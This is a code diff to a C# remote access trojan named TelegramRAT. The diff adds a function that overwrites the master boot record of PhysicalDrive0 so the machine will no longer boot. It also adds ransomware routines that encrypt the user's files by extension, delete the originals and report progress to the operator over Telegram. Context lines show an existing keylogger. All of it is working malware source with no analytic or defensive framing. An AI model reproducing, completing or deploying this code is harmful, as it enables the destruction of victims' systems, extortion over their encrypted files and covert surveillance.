@@ -15,6 +15,7 @@ using System.Management;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -83,7 +84,25 @@ namespace TelegramRAT
         [DllImport("Winmm.dll", SetLastError = true)]
         static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);
 
+        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(
+            string lpFileName,
+            uint dwDesiredAccess,
+            uint dwShareMode,
+            IntPtr lpSecurityAttributes,
+            uint dwCreationDisposition,
+            uint dwFlagsAndAttributes,
+            IntPtr hTemplateFile);
 
+        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToWrite,
+            out uint lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
 
         // Is admin
         public static bool IsAdministrator()
@@ -174,7 +193,7 @@ namespace TelegramRAT
         {
             try
             {
-                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor")){
+                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor")) {
                     foreach (ManagementObject mObject in mSearcher.Get())
                     {
                         return mObject["ProcessorId"].ToString();
@@ -188,7 +207,7 @@ namespace TelegramRAT
         // Get system version
         private static string GetWindowsVersionName()
         {
-            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem")){
+            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem")) {
                 string sData = string.Empty;
                 foreach (ManagementObject tObj in mSearcher.Get())
                 {
@@ -259,7 +278,7 @@ namespace TelegramRAT
         public static void isConnectedToInternet()
         {
             // Check if connected to internet
-            while(true)
+            while (true)
             {
                 Ping ping = new Ping();
                 PingReply reply;
@@ -364,8 +383,8 @@ namespace TelegramRAT
         public static void startKeylogger()
         {
             // Delete logs if exists
-            if(File.Exists(loggerPath))
-            { File.Delete(loggerPath);}
+            if (File.Exists(loggerPath))
+            { File.Delete(loggerPath); }
             _hookID = SetHook(_proc);
             Application.Run();
         }
@@ -500,7 +519,7 @@ namespace TelegramRAT
         {
             IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
             SendMessageW(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
-            
+
         }
 
         public static void MaximizeAllWindows()
@@ -539,6 +558,51 @@ namespace TelegramRAT
                 return;
             }
         }
+
+        // Overwrite MBR (destroy system)
+        public static void DestroySystem()
+        {
+            uint GenericAll = 0x10000000;
+            //dwShareMode
+            uint FileShareRead = 0x1;
+            uint FileShareWrite = 0x2;
+            //dwCreationDisposition
+            uint OpenExisting = 0x3;
+            //dwFlagsAndAttributes
+            uint MbrSize = 512u;
+
+            var mbrData = new byte[MbrSize];
+
+            var mbr = CreateFile(
+                "\\\\.\\PhysicalDrive0",
+                GenericAll,
+                FileShareRead | FileShareWrite,
+                IntPtr.Zero,
+                OpenExisting, 0, IntPtr.Zero);
+
+            if (mbr == (IntPtr)(-0x1))
+            {
+                telegram.sendText("⛔ Please start as admin!");
+                return;
+            }
+
+            if (WriteFile(
+                mbr,
+                mbrData,
+                MbrSize,
+                out uint lpNumberOfBytesWritten,
+                IntPtr.Zero))
+            {
+                telegram.sendText("😹 The boot sector has been overwritten. The system will no longer boot.");
+                return;
+            }
+            else
+            {
+                telegram.sendText("😿 Failed overwrite boot sector.");
+                return;
+            }
+        }
+
 
         // Rotate displays
         public class Display
@@ -855,6 +919,163 @@ namespace TelegramRAT
             }
         }
 
+        public static IEnumerable<string> GetFiles(string path, string searchPattern, SearchOption searchOption)
+        {
+            var foldersToProcess = new List<string>()
+            {
+                path
+            };
+
+            while (foldersToProcess.Count > 0)
+            {
+                string folder = foldersToProcess[0];
+                foldersToProcess.RemoveAt(0);
+
+                if (searchOption.HasFlag(SearchOption.AllDirectories))
+                {
+                    //get subfolders
+                    try
+                    {
+                        var subfolders = Directory.GetDirectories(folder);
+                        foldersToProcess.AddRange(subfolders);
+                    }
+                    catch 
+                    {
+                        //log if you're interested
+                    }
+                }
+
+                //get files
+                var files = new List<string>();
+                try
+                {
+                    files = Directory.GetFiles(folder, searchPattern, SearchOption.TopDirectoryOnly).ToList();
+                }
+                catch 
+                {
+                    //log if you're interested
+                }
+
+                foreach (var file in files)
+                {
+                    yield return file;
+                }
+            }
+        }
+
+        // Encrypt file system
+        public static void EncryptFileSystem(string key)
+        {
+            // Find
+            string encryptDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            var files = GetFiles(encryptDir, "*.*", SearchOption.AllDirectories);
+            List<string> encFiles = new List<string>{ };
+            foreach (string file in files)
+            {
+                if(config.EncryptionFileTypes.Contains(Path.GetExtension(file)))
+                    encFiles.Add(Path.GetFullPath(file));
+            }
+            telegram.sendText("🔒 " + encFiles.Count + " files will be encrypted");
+            // Encrypt
+            foreach (string file in encFiles)
+            {
+                EncryptFile(file, key);
+            }
+            telegram.sendText("🔒 All files encrypted in user directory");
+        }
+
+        // Decrypt file system
+        public static void DecryptFileSystem(string key)
+        {
+            // Find
+            string encryptDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            var files = GetFiles(encryptDir, "*.crypted", SearchOption.AllDirectories);
+            telegram.sendText("🔓 " + files.Count() + " files will be decrypted");
+            // Decrypt
+            foreach (string file in files)
+            {
+                DecryptFile(file, key);
+            }
+            telegram.sendText("🔓 All files decrypted in user directory");
+        }
+
+        // Encrypt string
+        private static byte[] EncryptBytes(byte[] clearBytes, string EncryptionKey)
+        {
+            using (Aes encryptor = Aes.Create())
+            {
+                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
+                encryptor.Key = pdb.GetBytes(32);
+                encryptor.IV = pdb.GetBytes(16);
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(clearBytes, 0, clearBytes.Length);
+                        cs.Close();
+                        return ms.ToArray();
+                    }
+                }
+            }
+        }
+
+        // Decrypt string
+        private static byte[] DecryptBytes(byte[] cipherBytes, string EncryptionKey)
+        {
+            using (Aes encryptor = Aes.Create())
+            {
+                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
+                encryptor.Key = pdb.GetBytes(32);
+                encryptor.IV = pdb.GetBytes(16);
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(cipherBytes, 0, cipherBytes.Length);
+                        try
+                        {
+                            cs.Close();
+                        }
+                        catch (CryptographicException)
+                        {
+                            telegram.sendText("Failed to decrypt file. Wrong password!");
+                            return ms.ToArray();
+                        }
+                    }
+                    return ms.ToArray();
+                }
+            }
+        }
+
+        // Encrypt file
+        private static void EncryptFile(string inputFile, string password)
+        {
+            // Check file
+            if (!File.Exists(inputFile))
+            {
+                return;
+            }
+            string outputFile = inputFile + ".crypted";
+            byte[] content = File.ReadAllBytes(inputFile);
+            byte[] encrypted = EncryptBytes(content, password);
+            File.WriteAllBytes(outputFile, encrypted);
+            File.Delete(inputFile);
+        }
+
+        // Decrypt file
+        private static void DecryptFile(string inputFile, string password)
+        {
+            // Check file
+            if (!File.Exists(inputFile))
+            {
+                return;
+            }
+            string outputFile = inputFile.Replace(".crypted", "");
+            byte[] content = File.ReadAllBytes(inputFile);
+            byte[] decrypted = DecryptBytes(content, password);
+            File.WriteAllBytes(outputFile, decrypted);
+            File.Delete(inputFile);
+        }
 
         // Set audio volume
         public static void AudioVolumeSet(int volume)
